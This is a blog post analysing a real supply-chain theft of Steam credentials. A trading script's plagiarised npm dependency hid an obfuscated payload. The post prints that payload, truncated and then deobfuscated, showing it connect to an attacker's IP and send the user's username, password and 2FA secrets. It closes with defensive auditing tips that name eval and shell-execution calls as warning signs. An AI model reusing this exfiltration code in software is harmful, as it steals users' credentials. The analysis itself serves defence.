---
title: "Code Auditing for Non-Programmers"
date: 2018-01-29T12:35:18Z
tags: ["misc"]
---

I can't believe this. Someone actually went and implemented the attack vector described in [an article posted earlier this month](https://hackernoon.com/im-harvesting-credit-card-numbers-and-passwords-from-your-site-here-s-how-9a8cb347c5b5). **Tl;dr**: Malicious payload stored in an application dependency.

Around US$6,000 in TF2 items were stolen by a scammer who obtained Steam account credentials via a script they wrote. There was a window of over two weeks between release of the malicious script, and fraud being committed. This should have been avoided.

The scammer advertised his script on the backpack.tf forums, which immediately caused a bit of alarm based on what it would do: automatically overcut or undercut (i.e. list with the best price needed to always appear first) on our classifieds system. Generally, this behaviour is frowned upon because it is poor form. This user had previously been banned from several communities -- including this one -- for various reasons, and a bug in previous software he had written resulted in personal losses of thousands of dollars. In hindsight, it's clear he had a motive to do what was done, and inevitably capitalised on the laziness of his victims.

After harvesting enough user credentials, the scammer started to sign in to his victims' accounts to trade off entire inventory contents to various holding accounts. In one case, a victim's Marketplace.tf account was compromised via the Steam OpenID login (which could have been prevented by the victim, as Marketplace.tf has its own 2FA implementation). Their Marketplace.tf inventory contents were withdrawn, and a small cash payout was made to an anonymous email address.

It was when users became aware that their accounts had been hijacked that this was promptly investigated. Victims were fast to conclude that they had all, at some point, ran this script. This prompted an audit of the source code. But the damage had already been done; the scammer had gone into hiding and did his best to cover his tracks.

Ultimately, the scammer's Steam accounts were all trade banned by Valve, so the scammer did not receive much profit from dragging his reputation through the mud. However this does not mean the victims have been reimbursed, and they have had to learn a lesson or two about trusting scripts from strangers.

## Payload analysis

A thorough inspection of code in the repository showed no malicious functions; there were no dodgy HTTP requests or obfuscated `eval` bundles, and handled any credentials in a way that was obvious. Despite being poorly written, the software did what it was supposed to do. It was completely clean -- or was it? 

What was overlooked was a dependency -- a console color module with a malicious payload *just as described in the article*. This module was a line-for-line copy of the existing [better console](https://www.npmjs.com/package/better-console) module, except for when an info message is logged:

{{< highlight js >}}
  // Writes a message to the console with blue color
  info: function(){
    console.log.apply(this, arguments);		var a=['ZW1pdA==','bm9kZS1yc2E=','LS0tLS1CRUdJTiBSU...'
  }
{{< / highlight >}}

**NB**: This is massively truncated. The payload had a lot more whitespace to try and fool anyone not paying attention to the horizontal scrollbar.

Simply reformatting the one-liner revealed enough about what it did, without needing to run a deobfuscator.

{{< highlight js >}}
if (config != undefined) {
    var d = require('socket.io-client');
    var e = require(b('0x0'));
    var f = new e(b('0x1'));
    var g = JSON[b('0x2')](config);
    var h = f[b('0x3')](g, b('0x4'));
    try {
        var i = d['connect']('http://45.56.74.164:8080');
    } catch (j) {
    }
    i['on'](b('0x5'), () => {});
    i[b('0x6')]('chat\x20message', h);
    setTimeout(function () {
        i['disconnect']();
    }, 0x7d0);
}
{{< / highlight >}}

This snippet:

* Opens a websocket connection to the scammer's remote web server
* Sends the JSON-encoded contents of a global `config` variable, which contains the user's credentials -- Steam username, password, and two-factor authentication secrets (fwiw, Steam's 2FA is practically snake oil)
* Closes the connection after two seconds

He could have just left it deobfuscated and he would have still succeeded. It does not matter. It was hidden well enough that nobody bothered to look for it.

## Conclusions

I have a huge concern for users who are using arbitrarily-sourced scripts without knowing what they might do. The JavaScript ecosystem in particular is wonderful for hiding a payload in plain sight; a lackluster stdlib and the number of external dependencies that are needed to compensate for it, and applications that abuse variables available on the global scope. In this case, an exploit happened thanks to the inclusion of a simple vanity package that flew under the radar.

It's hard to educate users on how to make sure what they are using is legit. There is no guarantee that auto-updating software or its dependencies will stay clean. Saying "don't trust code ever" is just wrong, and users depending on someone else to tell them if software is legitimate or not is also wrong.

We should try to instruct users on how to audit the code they're about to run -- without necessarily teaching them to program.

## Identifying malicious code

First things first: Do you trust the person you're acquiring code from? At any point, despite originally releasing genuine software, they may subtly add a new, malicious feature. You're not going to check the source code after every update, are you?

Regardless, you should know how to identify malicious code without necessarily being able to read it, whether you are a programmer or not. These tips should help you identify suspect code in common scripting languages:

1. **Look for blatantly obfuscated code.** For some reason, malicious actors *love* to obfuscate their payloads when it's not necessary. I'm not sure why. If you see random strings of characters and anonymous variable names in the middle of otherwise nicely-written code, it should be pretty obvious there's something to hide.
  * **JavaScript**: Search for uses of `eval`. The use of `eval` is a sure sign that code is vulnerable to exploitation, intentionally or not. It is either bad code, or *bad* code. Used by attackers, this is used to pack and run malicious code. Used by novice programmers, this is used to write bots that answer maths questions and inevitably get hacked to death.
  * Do keep an eye on the horizontal scrollbar, or enable soft wrapping in your text editor to reveal hidden snippets.
  
2. **Look for shell command calls.** Like `eval`, *unnecessary* execution of shell commands may be bad or malicious. However, they may have a valid use case. Great care should be taken when using shell commands in code, as to not allow arbitrary execution of commands.
  * **JavaScript**: there are *many* ways to execute a shell command depending on the runtime environment, but you're probably running your scripts with Node.js. Look for `child_process` and see how this is being used.   
  * **Python**: look for usages of `os.system`, `os.popen` or the `subprocess` module. `os.*` calls should be given more attention; these commands are not cleaned and may be vulnerable to command injection if variable interpolation is used.
  * **Python**: if using Windows, also look for usages of the `win32api` module to see how this is being used.  
  
3. **Check the dependencies.** As witnessed, dependencies are a great way to hide malicious code. If you don't know what something is, take a look at it. Then scrutinize it as you would for the rest of the source code using the above steps.
  * **JavaScript**: Software written in JavaScript and various compile-to-JS languages often use the centralised npm repository. Dependencies are listed in the included `package.json` file, and package details can be checked at `https://www.npmjs.com/package/[package-name]`. If a package only has a few downloads, it should be examined thoroughly. **npm is largely unmoderated: anyone can submit a package, and anyone can pretend to be someone else**. It takes mere minutes to plagiarize someone else's package to make a copy with a similar name, so disregard any repository links, homepage links, or how pretty it looks.
  * When checking dependencies, disregard what code you see in the public repository. This won't necessarily be the same code you will download from a package manager for various reasons. **Inspect the code that was actually downloaded through the package manager.**
 
Ultimately, the number of people using a piece of software will correlate with the number of people closely inspecting it. Be careful of what you are running, especially if you are part of a niche community that does not necessarily have a wide developer scene.

Stay safe out there.